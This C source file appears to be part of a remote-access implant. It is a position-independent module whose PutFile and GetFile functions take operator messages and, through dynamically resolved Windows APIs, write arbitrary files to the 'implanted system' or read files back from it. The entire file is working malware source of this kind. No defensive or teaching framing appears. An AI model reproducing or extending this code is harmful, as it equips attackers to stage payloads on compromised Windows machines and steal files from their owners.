/*
    PIC module for creating and retrieving file contents from the implanted system.
*/

#pragma once

#include <stdint.h>
#include <stdbool.h>
#include "Config.h"

/*
* @brief Interprets a message as a Put File, write to disk, command
* and calls necessary Windows APIs to create / write to a file
* @param Config network context, dynamic imports, and runtime data
* @param Message Pointer to message containing PutFile command data
* @return status of create / write operation
*/
bool PutFile(PCONFIG Config, PMESSAGE Message)
{
    /*  PutFile Message.Value substructure:
    *   |- uint32_t         NameLength
    *   |- char[NameLength] FileName
    *   |- char[]           FileData    (Size: Message.Length - NameLength - sizeof(uint32_t))
    */
    /* Fetch parameters from message. NameLength should include NUL terminator. */
    if (Message->Length < sizeof(uint32_t))
    {
        return false;
    }

    uint32_t NameLength = *(uint32_t*)Message->Value;

    if (NameLength > Message->Length - sizeof(uint32_t))
    {
        return false;
    }

    const char* FileName = (const char*)Message->Value + sizeof(uint32_t);
    uint8_t* FileData = Message->Value + sizeof(uint32_t) + NameLength;
    uint32_t DataLength = Message->Length - sizeof(uint32_t) - NameLength;

    /* Do the actual open/write/close */
    HANDLE hFile = Config->Imports->CreateFileA(FileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        return false;
    }

    uint32_t BytesWritten = 0;
    bool status = Config->Imports->WriteFile(hFile, FileData, DataLength, &BytesWritten, NULL);
    Config->Imports->CloseHandle(hFile);
    return status;
}


/*
* @brief Interprets a message as a Get File, read from disk, command
* and calls necessary Windows APIs to open / read from a file
* @param [in] Config network context and dynamic imports
* @param [in] Message Pointer to message containing GetFile command data
* @param [out], Address of unsigned to output number of data bytes read
* @param [out], Address of uint8_t pointer to output resulting data buffer (must be freed with HeapFree after use)
* @return status of open / read operation, false = failure
*/
bool GetFile(PCONFIG Config, PMESSAGE Message, unsigned * DataLen, uint8_t ** Data)
{
    /*  PutFile Message.Value substructure:
    *   |- char[Message.Length] FileName
    */
    (void)Config;

    DBGPRINT(Config->Imports->DbgPrint, "(GetFile) Received Message Length: %u\n", Message->Length);
    DBGPRINT(Config->Imports->DbgPrint, "(GetFile) Received Message Value: %.*s\n", Message->Length, Message->Value);

    // check GetFile has a message with contents/value
    if (Message->Length < 1)
    {
        return false;
    }

    uint8_t* FileName = Message->Value;

    HANDLE hFile = Config->Imports->CreateFileA((LPCSTR) FileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        DBGPRINT(Config->Imports->DbgPrint, "(GetFile) Opening File Failed.\n");
        return false;
    }

    // get file size then allocate heap space to contain the contents after read
    unsigned fileSize = Config->Imports->GetFileSize(hFile, NULL);
    *Data = Config->Imports->HeapAlloc(Config->Imports->GetProcessHeap(), 0, fileSize);
    if (*Data == NULL) {
        DBGPRINT(Config->Imports->DbgPrint, "(GetFile) Heap Allocation Failed.\n");
        Config->Imports->CloseHandle(hFile);
        return false;
    }
    bool status = Config->Imports->ReadFile(hFile, *Data, fileSize, (uint32_t *) DataLen, NULL);
    if (status == false) {
        DBGPRINT(Config->Imports->DbgPrint, "(GetFile) Reading File Failed.\n");
    }
    Config->Imports->CloseHandle(hFile);
    DBGPRINT(Config->Imports->DbgPrint, "(GetFile) File Size: %u\n", fileSize);
    DBGPRINT(Config->Imports->DbgPrint, "(GetFile) Bytes Read: %u\n", *DataLen);
    DBGPRINT(Config->Imports->DbgPrint, "(GetFile) File Data: %.*s\n", fileSize, *Data);
    return status;
}

